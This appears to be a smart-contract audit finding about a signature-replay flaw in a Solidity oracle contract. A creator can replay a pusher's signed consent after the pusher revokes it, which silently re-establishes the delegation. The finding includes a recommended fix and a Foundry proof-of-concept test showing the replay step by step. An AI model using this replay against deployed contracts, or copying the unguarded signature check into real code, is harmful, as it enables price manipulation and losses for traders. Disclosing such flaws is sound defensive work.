### Title
Pusher Delegation Signature Replay After `revokePusher()` Allows Creator to Silently Re-Establish Delegation Within the Deadline Window — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers()` signs consent over `(chainid, oracle, deadline, pusher, creator)` but tracks **no nonce and no used-signature bitmap**. After a pusher calls `revokePusher()`, the creator can immediately replay the original, still-valid signature (deadline has not yet expired) to re-write `namespaceRemapping[pusher] = creator`. The pusher's revocation is silently undone; their subsequent fallback pushes land in the creator's namespace rather than their own, feeding the creator's live pool feeds with prices the pusher no longer consented to provide.

---

### Finding Description

`allowPushers` builds its EIP-191 hash as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The only replay guard is the `deadline` field. `revokePusher()` clears `namespaceRemapping[pusher]` to `address(0)`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [2](#0-1) 

But the signature itself is never marked as used. As long as `block.timestamp <= deadline`, the creator can call `allowPushers` again with the identical `(deadline, [pusher], [sig])` tuple, passing `_ensureDeadline` and the ECDSA check, and overwriting `namespaceRemapping[pusher]` back to `creator`. The code's own NatSpec acknowledges the concern ("an undated signature could re-establish a delegation AFTER the pusher revoked it") but the deadline only bounds the window — it does not close it: [3](#0-2) 

The analog to MagicSpend is exact: just as `_gasMaxCostExcess` is not zeroed after `postOp()` allows a second withdrawal, the delegation signature is not invalidated after `revokePusher()` allows a second (and third, …) re-delegation within the same deadline window.

---

### Impact Explanation

After re-delegation, the `fallback()` push path resolves the namespace as:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

The pusher, believing they have revoked and are now writing to their own namespace, pushes prices intended for a different feed or token pair. Those pushes land in the creator's namespace. Any `AnchoredPriceProvider` bound to the creator's `feedId` reads the wrong price through `_readLeg → IPricedOracle.price(feedId, pool)`: [5](#0-4) 

The pool's `getBidAndAskPrice()` returns a bid/ask derived from the wrong mid, causing swaps to execute at a bad price — direct loss to traders or LPs.

---

### Likelihood Explanation

- The creator is a semi-trusted, unprivileged namespace owner (not the oracle admin).
- Delegation deadlines are typically set days in the future (the test suite uses `block.timestamp + 1 days`).
- The replay requires only replaying calldata the creator already submitted once — zero additional off-chain work.
- The pusher may not monitor `PusherAuthorized` events continuously, so the silent re-delegation can persist through multiple push cycles before detection. [6](#0-5) 

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedDelegationHashes` and mark each hash as used on first acceptance:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedDelegationHashes[hash], "signature already used");
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedDelegationHashes[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

This mirrors the MagicSpend fix (`delete _gasMaxCostExcess[account]`) — once a consent signature is consumed, it cannot be replayed regardless of whether the deadline has elapsed.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent with deadline = now + 1 day
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator delegates pusher
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Creator replays the SAME signature — still within deadline
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // re-delegated without fresh consent

// 5. Pusher pushes a price thinking it goes to their own namespace
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 raw = _packRaw(9_000_000, 4, 2); // price intended for pusher's own feed
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
assertTrue(ok);

// 6. Price lands in creator's namespace — consumed by creator's pool
IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
assertEq(data.price, U64x32.decode(uint32(raw >> 16))); // wrong price in creator's feed
``` [7](#0-6)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L277-295)
```text
    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
```

**File:** smart-contracts-poc/test/oracles/compressed/CompressedOracle.t.sol (L339-356)
```text
    function testAllowPushersDelegatesNamespace() public {
        uint256 deadline = block.timestamp + 1 days;
        _allowPusher(deadline);
        assertEq(oracle.namespaceRemapping(pusher), creator, "pusher should map to creator");

        // delegated push lands in the CREATOR namespace, not the pusher's own
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = _packRaw(900_000, 5, 0);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(_wordAt(2, 3, raw, tsMs));
        assertTrue(ok, "delegated push failed");

        IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 2, 3));
        assertEq(data.price, U64x32.decode(uint32(raw >> 16)), "delegated push should land in creator namespace");

        IOffchainOracle.OracleData memory own = oracle.getOracleData(oracle.feedIdOf(pusher, 2, 3));
        assertEq(own.price, 0, "pusher's own namespace must stay empty");
    }
```
